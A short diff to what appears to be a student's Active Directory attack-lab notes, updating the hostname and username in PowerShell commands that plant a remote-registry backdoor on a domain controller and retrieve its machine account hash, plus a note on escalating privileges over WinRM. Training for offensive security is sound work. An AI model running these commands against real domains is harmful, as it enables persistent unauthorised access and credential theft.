@@ -23,10 +23,10 @@ ACLs can be modified to allow non-admin users access to securable objects. Using
 ##### Remote Registry (machine hash backdoor)
 Using RACE or DAMP, with admin privs on remote machine
 ```powershell
-Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student548 -Verbose
 ```
 
-As student1, retrieve machine account hash
+As student548, retrieve machine account hash
 ```powershell
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
 ```
@@ -61,6 +61,11 @@ Removing permissions
 ```powershell
 Set-RemotePSRemoting -SamAccountName student548 -ComputerName dcorp-dc -Remove
 ```
+
+
+> [!NOTE] **NOTE**
+> Permissions within the WinRM will be the same as a regular user but that doesn't mean we cant Priv Esc on the machine
+
 ##### WMI
 On a local machine
 ```powershell
